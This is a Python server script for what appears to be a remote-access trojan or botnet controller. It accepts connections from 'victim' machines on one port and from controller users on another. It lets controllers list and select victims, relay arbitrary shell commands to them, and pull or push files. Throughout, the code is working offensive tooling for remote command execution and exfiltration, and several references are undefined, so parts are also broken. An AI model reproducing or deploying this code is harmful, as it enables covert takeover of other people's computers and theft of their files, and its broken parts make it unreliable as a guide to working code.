# Some code written by prasanna
# Basic code written by a youtube channel guy i forgot but credits goes to him :)
import socket
import sys
import os
import threading
import time
from queue import Queue
import socket_connection as sc

normal_clients = sc.socket_tools("0.0.0.0",1025,".0903e3ddsda334d3.dasd234342.;sfaf'afafaf[a]]fasd.one")
sudo_user = sc.socket_tools("0.0.0.0",1026,".0903e3ddsda334d3.dasd234342.;sfaf'afafaf[a]]fasd.one")

def send_data_target(ser):
    def start_turtle(ser):

        while True:
            cmd = sudo_user.receiver(ser)
            if cmd == 'list' or cmd == 'ls':
                list_connections(ser)
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn,ser)
            elif 'exit' == cmd:
                quit()

            else:
                print("Command not recognized")


    # Display all current active connections with client

    def list_connections(ser):
        results = ''

        for i, conn in enumerate(normal_clients.all_connections):
            try:
                normal_clients.sender(conn,' ')
                normal_clients.receiver(conn)
            except:
                del normal_clients.all_connections[i]
                del normal_clients.all_address[i]
                continue

            results = [all_address[i][0],all_address[i][1]]
            sudo_user.sender(ser, results)
        


    # Selecting the target
    def get_target(cmd):
        try:
            target = cmd.replace('select ', '')  # target = id
            target = int(target)
            conn = normal_clients.all_connections[target]
            #print("You are now connected to :" + str(normal_clients.all_address[target][0]))
            #print(str(all_address[target][0]) + ">", end="")
            return conn
            # 192.168.0.4> dir

        except:
            print("Selection not valid")
            return None


    # Send commands to client/victim or a friend
    def send_target_commands(conn,ser):
        while True:
            try:
                cmd = sudo_user.receiver(ser)
                if cmd == 'quit' or cmd == 'exit':
                    break
                elif cmd == 'filetransferinitiate':
                    type_of_transfer = input("Enter type of transfer(from,to)(target,u): ")
                    type_of_transfer = type_of_transfer.split(",")
                    if type_of_transfer[0] == "target":
                        path = input('From Path: ')
                        to = input('To Path: ')
                        sender(conn,"filetransferfromu12344")
                        sender(conn,path)
                        length = int(conn.recv(200000).decode())
                        ar = conn.recv(length)
                        fil = open(to,"wb")
                        fil.write(ar)
                        fil.close()
                        print("received")
                        del fil,ar,to
                        
                    elif type_of_transfer[1] == "target":
                        t_path = input("To Path: ")
                        f_path = input("From Path: ")
                        sender(conn,"filetransferfromus12344")
                        sender(conn,t_path)
                        fi = open(f_path,"rb")
                        a = fi.read()
                        conn.send(str(len(a)).encode())
                        time.sleep(0.2)
                        conn.send(a)
                        fi.close()
                        print("sent")
                        print(">", end="")
                        del a,fi
                        


                elif len(str.encode(cmd)) > 0:
                    normal_clients.sender(conn,cmd)
                    client_response = normal_clients.receiver(conn)
                    sudo_user.sender(ser,client_response)
                    
                    
            except Exception as msg:
                print("Error sending commands",msg)
                break
    start_turtle(ser)


accept_cl = threading.Thread(target=normal_clients.accepting_connections)
sudo_use = threading.Thread(target=sudo_user.accepting_connections)

accept_cl.daemon = True
sudo_use.daemon = True

sudo_use.start()
print("D: Started thread to accept sudo controllers ")
accept_cl.start()
print("D: Started thread to accept clients")

finished_conn = []
print("D: Starting thread to create threads for sudo controllers")
while True:
    for i in sudo_user.all_connections:
        if not i in finished_conn:
            finished_conn.append(i)
            data_s = threading.Thread(target=send_data_target,args=(i,))
            data_s.daemon = True
            data_s.start()
